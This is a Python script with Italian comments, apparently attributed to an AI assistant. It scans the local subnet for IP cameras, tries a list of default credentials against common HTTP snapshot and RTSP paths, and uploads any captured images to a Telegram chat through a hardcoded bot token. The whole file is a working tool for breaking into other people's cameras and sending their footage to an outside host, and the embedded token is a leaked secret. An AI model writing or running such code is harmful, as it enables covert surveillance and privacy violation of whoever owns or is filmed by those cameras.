#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
📷 Local Network Camera Snapshot Grabber
--------------------------------------------------------------------------------
Autore: Second Brain Quantitative Assistant
Descrizione: Scansiona la rete locale, trova telecamere IP attive,
             prova le credenziali di default più comuni e invia gli
             snapshot su Telegram. Tenta sia RTSP (via OpenCV) che
             HTTP snapshot endpoints.
--------------------------------------------------------------------------------
"""

import os
import sys
import json
import time
import socket
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

TOKEN  = "8215784991:AAE-78OdQk3pZZVSY22CfqnXBlyZjT-q1dA"
CHAT_ID = "715100445"

SNAP_DIR = "scratch/cam_snaps"
os.makedirs(SNAP_DIR, exist_ok=True)

# ── Credenziali default più comuni per IP cam ─────────────────────────────────
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
    ("root", "root"),
    ("root", ""),
    ("root", "1234"),
    ("user", "user"),
    ("guest", "guest"),
    ("", ""),
]

# URL snapshot HTTP comuni per diverse marche
HTTP_SNAP_PATHS = [
    "/snapshot.jpg",
    "/cgi-bin/snapshot.cgi",
    "/Streaming/Channels/1/picture",   # Hikvision
    "/onvif/snapshot",
    "/image/jpeg.cgi",                  # Axis
    "/tmpfs/snap.jpg",
    "/cgi-bin/hi3510/snap.cgi?&-getstream&-chn=1",
    "/snap.jpg",
    "/image.jpg",
    "/videostream.cgi?user=admin&pwd=&resolution=8&rate=0",
    "/mjpg/video.mjpg",
    "/api/snapshot",
    "/ISAPI/Streaming/Channels/101/picture", # Hikvision
]

# Percorsi RTSP standard
RTSP_PATHS = [
    "/stream1",
    "/stream",
    "/live/ch00_0",
    "/h264Preview_01_main",
    "/ch0_0.264",
    "/live",
    "/Streaming/Channels/1",
    "/cam/realmonitor?channel=1&subtype=0",
    "/video1",
    "/live/main",
    "/H.264",
    "",
]

CAMERA_PORTS = [554, 80, 8080, 81, 88, 8888]

# ── Rete ─────────────────────────────────────────────────────────────────────

def get_subnet():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ".".join(ip.split(".")[:-1]), ip
    except Exception:
        return "192.168.1", "192.168.1.1"

def is_port_open(ip, port, timeout=0.8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        return s.connect_ex((ip, port)) == 0
    except Exception:
        return False
    finally:
        s.close()

def scan_host(ip):
    open_ports = [p for p in CAMERA_PORTS if is_port_open(ip, p)]
    return (ip, open_ports) if open_ports else None

# ── Telegram helpers ──────────────────────────────────────────────────────────

def send_message(text):
    url  = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = json.dumps({"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}).encode()
    req  = urllib.request.Request(url, data=data,
                                   headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status == 200
    except Exception as e:
        print(f"send_message error: {e}")
        return False

def send_photo(file_path, caption=""):
    if not os.path.exists(file_path):
        return False
    url      = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    boundary = "----Boundary7MA4YWxk"
    with open(file_path, "rb") as f:
        photo_data = f.read()
    parts = [
        f"--{boundary}".encode(),
        b'Content-Disposition: form-data; name="chat_id"', b"",
        CHAT_ID.encode(),
        f"--{boundary}".encode(),
        b'Content-Disposition: form-data; name="caption"', b"",
        caption.encode("utf-8"),
        f"--{boundary}".encode(),
        b'Content-Disposition: form-data; name="photo"; filename="snap.jpg"',
        b"Content-Type: image/jpeg", b"",
        photo_data,
        f"--{boundary}--".encode(),
    ]
    body = b"\r\n".join(parts)
    req  = urllib.request.Request(url, data=body, headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
        "User-Agent": "Mozilla/5.0"
    })
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            res = json.loads(r.read().decode())
            return res.get("ok", False)
    except Exception as e:
        print(f"send_photo error: {e}")
        return False

# ── Snapshot via HTTP ─────────────────────────────────────────────────────────

def try_http_snapshot(ip, port, user, pwd, path):
    try:
        if user or pwd:
            auth = urllib.parse.quote(user, safe="") + ":" + urllib.parse.quote(pwd, safe="")
            url  = f"http://{auth}@{ip}:{port}{path}"
        else:
            url  = f"http://{ip}:{port}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as r:
            ct = r.headers.get("Content-Type", "")
            if "image" in ct or "jpeg" in ct or "jpg" in ct:
                data = r.read()
                if len(data) > 2000:  # Must be a real image
                    return data
    except Exception:
        pass
    return None

# ── Snapshot via RTSP (OpenCV) ────────────────────────────────────────────────

def try_rtsp_snapshot(ip, user, pwd, path):
    if not HAS_CV2:
        return None
    try:
        if user or pwd:
            auth = f"{urllib.parse.quote(user, safe='')}:{urllib.parse.quote(pwd, safe='')}@"
        else:
            auth = ""
        rtsp_url = f"rtsp://{auth}{ip}:554{path}"
        cap = cv2.VideoCapture(rtsp_url)
        cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 5000)
        cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, 5000)
        if cap.isOpened():
            time.sleep(1.0)
            ret, frame = cap.read()
            cap.release()
            if ret and frame is not None:
                out_path = os.path.join(SNAP_DIR, f"{ip.replace('.','_')}_rtsp.jpg")
                cv2.imwrite(out_path, frame)
                return out_path
        cap.release()
    except Exception as e:
        print(f"RTSP error {ip}: {e}")
    return None

# ── Per ogni host ─────────────────────────────────────────────────────────────

def grab_camera(ip, ports):
    print(f"\n[TRY] Tentativo su {ip} | Porte aperte: {ports}")
    snap_saved = None

    # ── 1. Prova HTTP snapshot sulle porte aperte ─────────────────────────────
    http_ports = [p for p in ports if p != 554]
    for port in http_ports:
        for user, pwd in DEFAULT_CREDS:
            for path in HTTP_SNAP_PATHS:
                data = try_http_snapshot(ip, port, user, pwd, path)
                if data:
                    fname = f"{ip.replace('.','_')}_http_{port}.jpg"
                    out   = os.path.join(SNAP_DIR, fname)
                    with open(out, "wb") as f:
                        f.write(data)
                    snap_saved = out
                    cred_str = f"{user}:{pwd}" if (user or pwd) else "(no auth)"
                    print(f"  [OK] HTTP snapshot OK: {ip}:{port}{path} [{cred_str}]")
                    break
            if snap_saved:
                break
        if snap_saved:
            break

    # ── 2. Se non trovato via HTTP, prova RTSP ────────────────────────────────
    if not snap_saved and 554 in ports:
        for user, pwd in DEFAULT_CREDS:
            for path in RTSP_PATHS:
                result = try_rtsp_snapshot(ip, user, pwd, path)
                if result:
                    snap_saved = result
                    print(f"  [OK] RTSP snapshot OK: rtsp://{ip}:554{path}")
                    break
            if snap_saved:
                break

    return snap_saved

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    # Fix encoding Windows
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        import io
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

    subnet, my_ip = get_subnet()
    print(f"[*] Il mio IP: {my_ip} | Subnet: {subnet}.0/24")

    send_message(
        f"🔍 <b>Scansione telecamere rete locale avviata</b>\n"
        f"Subnet: <code>{subnet}.0/24</code>\n"
        f"Provo credenziali di default su ogni dispositivo trovato…"
    )

    # Scan di tutti gli host
    all_ips = [f"{subnet}.{i}" for i in range(1, 255) if f"{subnet}.{i}" != my_ip]
    found   = []
    with ThreadPoolExecutor(max_workers=80) as ex:
        for res in ex.map(scan_host, all_ips):
            if res:
                found.append(res)

    print(f"[SCAN] Trovati {len(found)} host con porte aperte.")

    if not found:
        send_message(
            "ℹ️ <b>Nessuna telecamera trovata</b>\n"
            "Nessun host nella rete ha porte video aperte (554/80/8080/81/88/8888)."
        )
        return

    # Lista host trovati
    host_list = "\n".join(
        f"• <code>{ip}</code> → porte {ports}" for ip, ports in found
    )
    send_message(f"📡 <b>Host con porte video rilevate:</b>\n{host_list}\n\n🔑 Provo le credenziali…")

    # Tenta snapshot su ogni host
    successes = 0
    for ip, ports in found:
        snap = grab_camera(ip, ports)
        if snap:
            successes += 1
            ok = send_photo(snap, f"📷 <b>Snapshot telecamera</b>\n🖥️ IP: <code>{ip}</code>")
            status = "✅ Inviata" if ok else "❌ Errore invio"
            print(f"  Telegram: {status}")
        else:
            print(f"  [FAIL] Nessuno snapshot ottenuto da {ip}")

    # Report finale
    if successes:
        send_message(
            f"✅ <b>Operazione completata</b>\n"
            f"📸 Snapshot ottenuti e inviati: <b>{successes}/{len(found)}</b>\n"
            f"Le cam protette da password non standard non sono accessibili."
        )
    else:
        send_message(
            f"🔒 <b>Tutte le telecamere sono protette da password</b>\n"
            f"Trovati <b>{len(found)}</b> dispositivi ma nessuno accetta le credenziali di default.\n"
            f"Per accedere serve la password impostata dal proprietario."
        )

if __name__ == "__main__":
    main()
